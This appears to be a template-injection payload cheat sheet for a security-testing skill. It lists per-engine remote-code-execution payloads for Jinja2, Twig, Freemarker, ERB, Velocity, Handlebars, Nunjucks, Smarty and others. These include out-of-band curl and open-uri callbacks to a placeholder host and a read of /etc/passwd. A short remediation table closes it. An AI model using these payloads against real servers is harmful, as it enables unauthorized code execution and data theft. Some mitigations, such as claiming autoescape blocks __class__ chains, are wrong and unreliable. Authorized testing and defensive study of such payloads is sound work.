# SSTI Payloads — Per-Engine

**Provenance:** folded from three source notes:
- Guia Completo de Testes e Mitigação de SSTI.md
- Guia de Exploração e Mitigação de Injeção de Template (SSTI).md
- Guia Técnico de Server-Side Template Injection (SSTI).md

All payloads confirm evaluation via harmless system commands (`whoami`,
`id`, `hostname`). Do NOT substitute destructive commands — the skill's
authorization contract forbids it.

---

## Generic Math / Detection

```
{{7*7}}           -> 49 in Jinja2, Twig, Liquid, Nunjucks, Handlebars
${7*7}            -> 49 in Freemarker, Velocity, Thymeleaf
<%= 7*7 %>        -> 49 in ERB, EJS, JSP
#{7*7}            -> 49 in Ruby string interp (if reflected in ERB), Velocity
{{= 7*7 }}        -> 49 in Underscore templates
```

## Polyglot Error Probe

```
{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]
```

Triggers verbose errors in whichever engine parses it. Read the exception
class to identify the engine.

## Engine Behavioral Differentiators

```
{{7*'7'}}            -> Jinja2: "7777777" | Twig: 49 | err elsewhere
{{'a'.upper()}}      -> Jinja2: "A" | other: err
{{'a'|upper}}        -> Twig/Jinja2/Nunjucks: "A"
${"a"?upper_case}    -> Freemarker: "A"
{{7|filter}}         -> Nunjucks-style
```

---

## Jinja2 (Python — Flask, etc.)

### Config/global enumeration (Medium severity — information disclosure)

```
{{ config }}
{{ config.items() }}
{{ request.environ }}
{{ self }}
{{ self.__dict__ }}
{{ get_flashed_messages.__globals__ }}
```

### Class-chain to `os`

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[N]() }}   # where N is eval/os/etc index
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ joiner.__init__.__globals__.os.popen('whoami').read() }}
{{ namespace.__init__.__globals__.os.popen('whoami').read() }}
{{ lipsum.__globals__.os.popen('whoami').read() }}
```

### `request`-based chain (Flask)

```
{{ request.application.__self__._get_data_for_json.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") }}
```

### Blind (OOB)

```
{{ config.__class__.__init__.__globals__['os'].popen('curl http://OOB/ssti-jinja').read() }}
```

---

## Twig (PHP — Symfony, Drupal)

### `_self.env` callback chain (Twig < 1.20 / 2.x)

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### Sandboxed mode

```
{{["whoami"]|filter("system")}}      # Twig 2/3 if filter available
{{["whoami"]|map("system")|first}}
```

---

## Freemarker (Java — Apache, Liferay)

### Standard Execute utility

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder", ["whoami"]).start()}
```

### JythonRuntime (if present)

```
<#assign value="freemarker.template.utility.JythonRuntime"?new()>
<@value>import os;os.system("whoami")</@value>
```

---

## ERB (Ruby — Rails, Jekyll)

### Backticks

```
<%= `whoami` %>
<%= `id` %>
```

### IO.popen

```
<%= IO.popen('whoami').readlines() %>
<%= IO.popen('id').read %>
```

### `%x{}` / `system`

```
<%= %x(whoami) %>
<%= system('whoami') %>                # returns true/false, no stdout inline
<%= require 'open3'; Open3.capture2('whoami')[0] %>
```

### Blind (OOB)

```
<% require 'open-uri'; open('http://OOB/ssti-erb') %>
```

---

## Tornado (Python)

```
{% import os %}{{os.popen('whoami').read()}}
{% import subprocess %}{{subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE).communicate()[0] }}
```

---

## Velocity (Java — Apache Velocity, older Struts)

### Runtime.exec chain

```
#set($str="")
#set($chr="")
#set($ex=$str.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### `$request` parameter bounce (if in servlet context)

```
#set($x=$request.getParameter("x"))#set($r=$x.getClass().forName("java.lang.Runtime"))
```

---

## Handlebars / Nunjucks (Node)

### Handlebars constructor chain (< 4.0.0)

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Nunjucks prototype chain

```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('whoami')")()}}
```

---

## Liquid (Ruby — Shopify, Jekyll)

Liquid is by design strict and typically does NOT allow RCE. SSTI in
Liquid usually means variable / filter abuse for information disclosure:

```
{{ shop }}                     # leaks shop config in Shopify
{{ request }}                  # sometimes leaks request metadata
{% include 'a' | file: '/etc/hostname' %}   # Liquid include abuse (rare)
```

If the app implemented a custom filter that wraps a system call, Liquid
CAN RCE through that filter — audit custom filter code.

---

## Smarty (PHP)

```
{php}echo `whoami`;{/php}       # Smarty 2.x with PHP tag enabled
{self::getStreamVariable("file:///etc/passwd")}    # Smarty 3.x
```

---

## Mako (Python)

```
<%
import os
x=os.popen('whoami').read()
%>
${x}
```

---

## Statement-Breakout Probes

When the field is inside a `{% ... %}` or `<% ... %>` statement block
(not an expression):

```
username}}                           # break {{ }}
%>                                    # break <% %>
?>                                    # break <? ?>
#*                                    # break Velocity/Freemarker comment
*/                                    # break server-side comment
```

Then follow with an HTML tag (`<h1>injected</h1>`) or another template
expression.

---

## Remediation Quick-Reference (per engine)

| Engine      | Primary Mitigation                                                        |
|-------------|---------------------------------------------------------------------------|
| Jinja2      | `SandboxedEnvironment`; deny `__class__` via `autoescape=True`            |
| Twig        | Enable Sandbox extension; strict whitelist of allowed tags/filters        |
| Freemarker  | `setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER)`|
| ERB         | Use `ERB::Util.h` for user data; switch to Liquid for user templates      |
| Tornado     | Avoid `{% import %}` in user-controllable templates; pre-compile only     |
| Velocity    | Apply uberspector allowlist; disable unrestricted introspection           |
| Handlebars  | `noEscape: false`; never `compile()` user input; use safe helpers         |
| Liquid      | Default already-safe; audit custom filters for system calls               |

Full per-engine remediation code snippets live in
`references/remediation.md` if present.
